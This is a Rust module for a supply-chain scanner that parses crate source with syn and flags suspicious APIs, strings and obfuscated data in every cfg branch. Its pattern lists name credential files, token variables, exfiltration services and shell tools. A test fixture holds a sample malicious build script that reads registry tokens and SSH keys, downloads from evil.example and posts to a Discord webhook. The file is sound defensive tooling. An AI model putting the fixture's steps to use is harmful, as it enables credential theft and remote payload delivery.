//! Rust source analysis with `syn`, across every `cfg` branch.
//!
//! `syn` parses a file without evaluating `cfg`, so code for Windows, macOS
//! and Linux is all visible in one pass. The visitor tracks the innermost
//! `cfg` predicate around what it visits and resolves paths through the
//! file's `use` declarations, so `Command::new` counts as process spawning
//! only when `Command` comes from `std::process` (and not, say, from
//! `clap`). Expressions inside macro calls such as `format!` are parsed and
//! visited too, since that is where many string literals live.

use std::collections::HashMap;

use proc_macro2::Span;
use syn::punctuated::Punctuated;
use syn::spanned::Spanned;
use syn::visit::{self, Visit};

use crate::findings::{CodeContext, Finding, FindingKind, Platform, Severity, evidence};

const NETWORK: &[&str] = &[
    "std::net::TcpStream",
    "std::net::UdpSocket",
    "std::net::TcpListener",
    "std::net::ToSocketAddrs",
    "tokio::net::",
    "async_std::net::",
    "reqwest::",
    "ureq::",
    "attohttpc::",
    "minreq::",
    "isahc::",
    "surf::",
    "curl::",
    "hyper::client",
    "hyper_util::client",
    "socket2::",
];
const PROCESS: &[&str] = &[
    "std::process::Command",
    "tokio::process::Command",
    "async_process::Command",
    "duct::cmd",
    "libc::execve",
    "libc::execvp",
    "libc::execv",
    "libc::system",
    "libc::fork",
    "libc::posix_spawn",
    "nix::unistd::exec",
    "nix::unistd::fork",
    "std::os::unix::process::CommandExt",
];
const WINDOWS_API: &[&str] = &[
    "URLDownloadToFile",
    "WinExec",
    "ShellExecute",
    "CreateProcess",
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "InternetOpen",
    "InternetReadFile",
    "WinHttpOpen",
    "RegSetValueEx",
    "NtUnmapViewOfSection",
];
const SECRET_ENV: &[&str] = &[
    "CARGO_REGISTRY_TOKEN",
    "CARGO_REGISTRIES_",
    "GITHUB_TOKEN",
    "GH_TOKEN",
    "NPM_TOKEN",
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "GOOGLE_APPLICATION_CREDENTIALS",
    "AZURE_CLIENT_SECRET",
    "SSH_AUTH_SOCK",
    "CI_JOB_TOKEN",
    "ACTIONS_RUNTIME_TOKEN",
    "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
    "DOCKER_PASSWORD",
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
];
const CREDENTIAL_PATHS: &[&str] = &[
    ".ssh/",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    ".cargo/credentials",
    ".aws/credentials",
    ".npmrc",
    ".pypirc",
    ".git-credentials",
    ".docker/config.json",
    ".kube/config",
    "Login Data",
    "wallet.dat",
    "Keychains/",
    "/.gnupg",
    ".config/gh/hosts.yml",
    "Default/Cookies",
    "Network/Cookies",
];
const EXFILTRATION: &[&str] = &[
    "discord.com/api/webhooks",
    "discordapp.com/api/webhooks",
    "api.telegram.org/bot",
    "hooks.slack.com",
    "pastebin.com",
    "transfer.sh",
    "webhook.site",
    "ngrok",
    "interact.sh",
    ".oast.pro",
    ".oast.fun",
    ".oast.live",
    ".oast.site",
    ".oast.online",
    ".oast.me",
    "requestbin",
];
const SHELL: &[&str] = &[
    "curl ",
    "wget ",
    "Invoke-WebRequest",
    "powershell",
    "bitsadmin",
    "certutil",
    "mshta",
    "rundll32",
    "/bin/sh -c",
    "bash -c",
    "chmod +x",
    "| sh",
    "|sh",
    "base64 -d",
    "nc -e",
];

/// A reference to a file by `include_bytes!` or `include_str!`, checked
/// against the archive by the caller.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Include {
    /// The literal argument.
    pub target: String,
    /// Line of the macro.
    pub line: u32,
    /// The `cfg` around it.
    pub cfg: Option<String>,
}

/// Result of scanning one file.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct FileScan {
    /// Findings.
    pub findings: Vec<Finding>,
    /// `include_bytes!` and `include_str!` targets.
    pub includes: Vec<Include>,
    /// The file level `#![cfg(...)]`, if any.
    pub file_cfg: Option<String>,
}

struct Scanner<'a> {
    file: &'a str,
    context: CodeContext,
    cfg: Vec<String>,
    imports: HashMap<String, String>,
    globs: Vec<String>,
    unsafe_count: u32,
    first_unsafe: Option<u32>,
    scan: FileScan,
}

fn line(span: Span) -> u32 {
    u32::try_from(span.start().line).unwrap_or(0)
}

fn cfg_of(attrs: &[syn::Attribute]) -> Option<String> {
    attrs.iter().find_map(|a| {
        if !a.path().is_ident("cfg") {
            return None;
        }

        match &a.meta {
            syn::Meta::List(list) => Some(list.tokens.to_string()),
            _ => None,
        }
    })
}

fn entropy(text: &str) -> f64 {
    let mut counts = [0_u32; 256];
    for b in text.bytes() {
        if let Some(c) = counts.get_mut(usize::from(b)) {
            *c += 1;
        }
    }
    #[allow(clippy::cast_precision_loss)]
    let len = text.len() as f64;
    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = f64::from(c) / len;
            -p * p.log2()
        })
        .sum()
}

impl Scanner<'_> {
    fn add(&mut self, kind: FindingKind, base: Severity, span: Span, text: &str) {
        let severity = if self.context.runs_at_build_time() {
            base.raised()
        } else {
            base
        };

        let cfg = self.cfg.last().cloned();
        let platform = cfg.as_deref().map_or(Platform::Any, Platform::from_cfg);
        self.scan.findings.push(Finding {
            kind,
            severity,
            file: self.file.to_owned(),
            line: Some(line(span)),
            context: self.context,
            cfg,
            platform,
            evidence: evidence(text),
        });
    }

    fn with_cfg(&mut self, attrs: &[syn::Attribute], f: impl FnOnce(&mut Self)) {
        let pushed = cfg_of(attrs)
            .inspect(|c| self.cfg.push(c.clone()))
            .is_some();
        f(self);

        if pushed {
            self.cfg.pop();
        }
    }

    /// The full path of a path expression, resolved through `use`.
    fn resolve(&self, path: &syn::Path) -> String {
        let segments: Vec<String> = path.segments.iter().map(|s| s.ident.to_string()).collect();
        let Some(first) = segments.first() else {
            return String::new();
        };

        let head = if let Some(full) = self.imports.get(first) {
            full.clone()
        } else if segments.len() <= 2
            && let Some(glob) = self.globs.iter().find(|g| {
                // `use std::process::*;` makes `Command` refer to it.
                (g.as_str() == "std::process" && first == "Command")
                    || (g.as_str() == "std::net" && first.ends_with("Stream"))
            })
        {
            format!("{glob}::{first}")
        } else {
            first.clone()
        };
        std::iter::once(head)
            .chain(segments.into_iter().skip(1))
            .collect::<Vec<_>>()
            .join("::")
    }

    fn collect_use(&mut self, prefix: &str, tree: &syn::UseTree) {
        let join = |a: &str, b: &str| {
            if a.is_empty() {
                b.to_owned()
            } else {
                format!("{a}::{b}")
            }
        };

        match tree {
            syn::UseTree::Path(p) => self.collect_use(&join(prefix, &p.ident.to_string()), &p.tree),
            syn::UseTree::Name(n) => {
                let full = join(prefix, &n.ident.to_string());
                self.imports.insert(n.ident.to_string(), full);
            }
            syn::UseTree::Rename(r) => {
                self.imports
                    .insert(r.rename.to_string(), join(prefix, &r.ident.to_string()));
            }
            syn::UseTree::Glob(_) => self.globs.push(prefix.to_owned()),
            syn::UseTree::Group(g) => {
                for item in &g.items {
                    self.collect_use(prefix, item);
                }
            }
        }
    }

    fn check_path(&mut self, path: &syn::Path) {
        // Most paths are a single local name (`u32`, `Self`, a variable).
        // They can only match through an import, a glob or a Windows API
        // name, so skip the others before building the full path.
        if path.segments.len() == 1
            && let Some(segment) = path.segments.first()
        {
            let name = segment.ident.to_string();
            let imported = self.imports.contains_key(&name)
                || (!self.globs.is_empty() && (name == "Command" || name.ends_with("Stream")));
            if !imported && !WINDOWS_API.iter().any(|w| name.starts_with(w)) {
                return;
            }
        }

        let full = self.resolve(path);
        let last = path
            .segments
            .last()
            .map(|s| s.ident.to_string())
            .unwrap_or_default();
        let span = path.span();

        // A pattern matches at the start or after a `::`, so a crate
        // renamed under another module (`crate::deps::reqwest::get`) still
        // counts.
        let at_segment = |p: &str| {
            full.match_indices(p)
                .any(|(i, _)| i == 0 || full.get(..i).is_some_and(|head| head.ends_with("::")))
        };

        if NETWORK.iter().any(|p| at_segment(p)) {
            self.add(FindingKind::NetworkAccess, Severity::Low, span, &full);
        } else if PROCESS.iter().any(|p| full.starts_with(p)) {
            self.add(FindingKind::ProcessSpawn, Severity::Low, span, &full);
        } else if full.ends_with("env::vars") || full.ends_with("env::vars_os") {
            self.add(
                FindingKind::EnvironmentEnumeration,
                Severity::Medium,
                span,
                &full,
            );
        } else if WINDOWS_API.iter().any(|w| last.starts_with(w)) {
            self.add(FindingKind::WindowsApi, Severity::Medium, span, &full);
        }
    }

    fn check_str(&mut self, value: &str, span: Span) {
        if EXFILTRATION.iter().any(|e| value.contains(e)) {
            self.add(
                FindingKind::ExfiltrationEndpoint,
                Severity::High,
                span,
                value,
            );
        } else if value.contains("://") {
            self.add(FindingKind::UrlLiteral, Severity::Info, span, value);
        }

        if CREDENTIAL_PATHS.iter().any(|c| value.contains(c)) {
            self.add(FindingKind::CredentialAccess, Severity::Medium, span, value);
        }

        if SECRET_ENV.iter().any(|e| value.starts_with(e)) {
            self.add(
                FindingKind::SecretEnvironmentVariable,
                Severity::Medium,
                span,
                value,
            );
        }

        if SHELL.iter().any(|s| value.contains(s)) {
            self.add(FindingKind::ShellCommand, Severity::Medium, span, value);
        }

        let encoded = value
            .bytes()
            .filter(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_'))
            .count();
        if value.len() >= 200 && encoded * 10 >= value.len() * 9 && entropy(value) >= 4.5 {
            self.add(FindingKind::ObfuscatedData, Severity::Medium, span, value);
        }
    }
}

impl<'ast> Visit<'ast> for Scanner<'_> {
    fn visit_item(&mut self, item: &'ast syn::Item) {
        let attrs: &[syn::Attribute] = match item {
            syn::Item::Const(i) => &i.attrs,
            syn::Item::Enum(i) => &i.attrs,
            syn::Item::ExternCrate(i) => &i.attrs,
            syn::Item::Fn(i) => &i.attrs,
            syn::Item::ForeignMod(i) => &i.attrs,
            syn::Item::Impl(i) => &i.attrs,
            syn::Item::Macro(i) => &i.attrs,
            syn::Item::Mod(i) => &i.attrs,
            syn::Item::Static(i) => &i.attrs,
            syn::Item::Struct(i) => &i.attrs,
            syn::Item::Trait(i) => &i.attrs,
            syn::Item::Type(i) => &i.attrs,
            syn::Item::Union(i) => &i.attrs,
            syn::Item::Use(i) => &i.attrs,
            _ => &[],
        };

        self.with_cfg(attrs, |s| {
            match item {
                syn::Item::Use(u) => s.collect_use("", &u.tree),
                syn::Item::ForeignMod(m) => {
                    s.add(
                        FindingKind::ForeignFunctions,
                        Severity::Low,
                        m.span(),
                        "extern block",
                    );

                    for foreign in &m.items {
                        if let syn::ForeignItem::Fn(f) = foreign {
                            let name = f.sig.ident.to_string();
                            if WINDOWS_API.iter().any(|w| name.starts_with(w)) {
                                s.add(
                                    FindingKind::WindowsApi,
                                    Severity::Medium,
                                    f.sig.ident.span(),
                                    &name,
                                );
                            }
                        }
                    }
                }
                syn::Item::Fn(f) if f.sig.unsafety.is_some() => s.count_unsafe(f.span()),
                syn::Item::Impl(i) if i.unsafety.is_some() => s.count_unsafe(i.span()),
                _ => {}
            }

            visit::visit_item(s, item);
        });
    }

    fn visit_impl_item(&mut self, item: &'ast syn::ImplItem) {
        let attrs: &[syn::Attribute] = match item {
            syn::ImplItem::Const(i) => &i.attrs,
            syn::ImplItem::Fn(i) => &i.attrs,
            syn::ImplItem::Type(i) => &i.attrs,
            syn::ImplItem::Macro(i) => &i.attrs,
            _ => &[],
        };

        self.with_cfg(attrs, |s| visit::visit_impl_item(s, item));
    }

    fn visit_stmt(&mut self, stmt: &'ast syn::Stmt) {
        let attrs: &[syn::Attribute] = match stmt {
            syn::Stmt::Local(l) => &l.attrs,
            syn::Stmt::Macro(m) => &m.attrs,
            _ => &[],
        };

        self.with_cfg(attrs, |s| visit::visit_stmt(s, stmt));
    }

    fn visit_expr(&mut self, expr: &'ast syn::Expr) {
        // `cfg` on expressions: blocks, calls and the like.
        let attrs: &[syn::Attribute] = match expr {
            syn::Expr::Block(e) => &e.attrs,
            syn::Expr::Call(e) => &e.attrs,
            syn::Expr::MethodCall(e) => &e.attrs,
            syn::Expr::Macro(e) => &e.attrs,
            syn::Expr::If(e) => &e.attrs,
            syn::Expr::Match(e) => &e.attrs,
            syn::Expr::Unsafe(e) => &e.attrs,
            syn::Expr::Assign(e) => &e.attrs,
            syn::Expr::Closure(e) => &e.attrs,
            _ => &[],
        };

        self.with_cfg(attrs, |s| visit::visit_expr(s, expr));
    }

    fn visit_expr_unsafe(&mut self, expr: &'ast syn::ExprUnsafe) {
        self.count_unsafe(expr.span());
        visit::visit_expr_unsafe(self, expr);
    }

    fn visit_attribute(&mut self, attr: &'ast syn::Attribute) {
        // Doc comments are prose: links and paths there are not code.
        if !attr.path().is_ident("doc") {
            visit::visit_attribute(self, attr);
        }
    }

    fn visit_path(&mut self, path: &'ast syn::Path) {
        self.check_path(path);
        visit::visit_path(self, path);
    }

    fn visit_lit_str(&mut self, lit: &'ast syn::LitStr) {
        self.check_str(&lit.value(), lit.span());
    }

    fn visit_lit_byte_str(&mut self, lit: &'ast syn::LitByteStr) {
        if lit.value().len() > 1024 {
            self.add(
                FindingKind::ObfuscatedData,
                Severity::Medium,
                lit.span(),
                "large byte string literal",
            );
        }
    }

    fn visit_expr_array(&mut self, array: &'ast syn::ExprArray) {
        let numbers = array
            .elems
            .iter()
            .filter(|e| {
                matches!(
                    e,
                    syn::Expr::Lit(syn::ExprLit {
                        lit: syn::Lit::Int(_),
                        ..
                    })
                )
            })
            .count();
        if numbers > 256 {
            self.add(
                FindingKind::ObfuscatedData,
                Severity::Medium,
                array.span(),
                &format!("array of {numbers} integer literals"),
            );
        }

        visit::visit_expr_array(self, array);
    }

    fn visit_macro(&mut self, mac: &'ast syn::Macro) {
        let name = mac
            .path
            .segments
            .last()
            .map(|s| s.ident.to_string())
            .unwrap_or_default();
        match name.as_str() {
            "asm" | "global_asm" | "naked_asm" => {
                self.add(
                    FindingKind::InlineAssembly,
                    Severity::Medium,
                    mac.span(),
                    &name,
                );
            }
            "include_bytes" | "include_str" => {
                if let Ok(lit) = mac.parse_body::<syn::LitStr>() {
                    self.scan.includes.push(Include {
                        target: lit.value(),
                        line: line(mac.span()),
                        cfg: self.cfg.last().cloned(),
                    });
                }
            }
            _ => {}
        }

        // Many strings and calls live inside macro invocations.
        if let Ok(exprs) =
            mac.parse_body_with(Punctuated::<syn::Expr, syn::Token![,]>::parse_terminated)
        {
            for expr in &exprs {
                self.visit_expr(expr);
            }
        }

        visit::visit_macro(self, mac);
    }
}

impl Scanner<'_> {
    fn count_unsafe(&mut self, span: Span) {
        self.unsafe_count += 1;
        self.first_unsafe.get_or_insert(line(span));
    }
}

/// Scans one Rust source file. A file that does not parse yields an
/// [`FindingKind::UnparsableSource`] finding instead.
#[must_use]
pub fn scan_file(file: &str, source: &str, context: CodeContext) -> FileScan {
    let parsed = match syn::parse_file(source) {
        Ok(parsed) => parsed,
        Err(error) => {
            return FileScan {
                findings: vec![Finding {
                    kind: FindingKind::UnparsableSource,
                    severity: Severity::Info,
                    file: file.to_owned(),
                    line: Some(line(error.span())),
                    context,
                    cfg: None,
                    platform: Platform::Any,
                    evidence: evidence(&error.to_string()),
                }],
                ..FileScan::default()
            };
        }
    };

    let file_cfg = cfg_of(&parsed.attrs);
    let mut scanner = Scanner {
        file,
        context,
        cfg: file_cfg.iter().cloned().collect(),
        imports: HashMap::new(),
        globs: Vec::new(),
        unsafe_count: 0,
        first_unsafe: None,
        scan: FileScan::default(),
    };

    // Imports first, so paths anywhere in the file resolve.
    for item in &parsed.items {
        if let syn::Item::Use(u) = item {
            scanner.collect_use("", &u.tree);
        }
    }

    scanner.visit_file(&parsed);

    if scanner.unsafe_count > 0 {
        let cfg = file_cfg.clone();
        scanner.scan.findings.push(Finding {
            kind: FindingKind::UnsafeCode {
                count: scanner.unsafe_count,
            },
            severity: Severity::Info,
            file: file.to_owned(),
            line: scanner.first_unsafe,
            context,
            platform: cfg.as_deref().map_or(Platform::Any, Platform::from_cfg),
            cfg,
            evidence: format!("{} unsafe blocks, functions or impls", scanner.unsafe_count),
        });
    }

    scanner.scan.file_cfg = file_cfg;
    scanner.scan
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kinds(scan: &FileScan) -> Vec<String> {
        scan.findings
            .iter()
            .map(|f| {
                serde_json::to_value(&f.kind).unwrap()["kind"]
                    .as_str()
                    .unwrap()
                    .to_owned()
            })
            .collect()
    }

    #[test]
    fn a_malicious_build_script_is_seen_on_every_platform() {
        let source = r#"
use std::process::Command;
use std::io::Write;

fn main() {
    let home = std::env::var("HOME").unwrap();
    let token = std::env::var("CARGO_REGISTRY_TOKEN");
    let key = format!("{}/.ssh/id_rsa", home);
    #[cfg(windows)]
    {
        let _ = Command::new("powershell").arg("Invoke-WebRequest https://evil.example/p.exe").status();
    }
    #[cfg(target_os = "macos")]
    let s = std::net::TcpStream::connect("198.51.100.7:443");
    let all: Vec<_> = std::env::vars().collect();
    println!("{}", "https://discord.com/api/webhooks/1/abc");
}
"#;
        let scan = scan_file("build.rs", source, CodeContext::BuildScript);
        let k = kinds(&scan);

        for expected in [
            "process_spawn",
            "shell_command",
            "secret_environment_variable",
            "credential_access",
            "network_access",
            "environment_enumeration",
            "exfiltration_endpoint",
        ] {
            assert!(
                k.iter().any(|x| x == expected),
                "missing {expected} in {k:?}"
            );
        }

        let spawn = scan
            .findings
            .iter()
            .find(|f| matches!(f.kind, FindingKind::ProcessSpawn))
            .unwrap();

        assert_eq!(spawn.platform, Platform::Windows);
        assert_eq!(spawn.line, Some(11));
        assert_eq!(
            spawn.severity,
            Severity::Medium,
            "build scripts raise severity"
        );

        let net = scan
            .findings
            .iter()
            .find(|f| matches!(f.kind, FindingKind::NetworkAccess))
            .unwrap();

        assert_eq!(net.platform, Platform::Apple);
    }

    #[test]
    fn clap_command_is_not_process_spawning() {
        let source = "use clap::Command;\nfn cli() -> Command { Command::new(\"app\") }\n";
        let scan = scan_file("src/main.rs", source, CodeContext::Binary);

        assert!(
            !kinds(&scan).iter().any(|k| k == "process_spawn"),
            "{:?}",
            kinds(&scan)
        );
    }

    #[test]
    fn unsafe_ffi_assembly_and_payloads_are_reported() {
        let numbers: Vec<String> = (0..300).map(|i| (i % 256).to_string()).collect();
        let source = format!(
            "#![cfg(windows)]\nextern \"system\" {{ fn URLDownloadToFileW(); }}\n\
             unsafe fn f() {{ core::arch::asm!(\"nop\"); }}\n\
             static P: [u8; 300] = [{}];\n\
             static B: &[u8] = include_bytes!(\"payload.bin\");\n",
            numbers.join(",")
        );
        let scan = scan_file("src/lib.rs", &source, CodeContext::Library);
        let k = kinds(&scan);

        for expected in [
            "foreign_functions",
            "windows_api",
            "inline_assembly",
            "obfuscated_data",
            "unsafe_code",
        ] {
            assert!(
                k.iter().any(|x| x == expected),
                "missing {expected} in {k:?}"
            );
        }

        assert_eq!(scan.file_cfg.as_deref(), Some("windows"));
        assert_eq!(scan.includes[0].target, "payload.bin");
    }

    #[test]
    fn unparsable_source_is_a_finding_not_an_error() {
        let scan = scan_file("src/lib.rs", "fn broken( {", CodeContext::Library);

        assert_eq!(kinds(&scan), vec!["unparsable_source"]);
    }
}
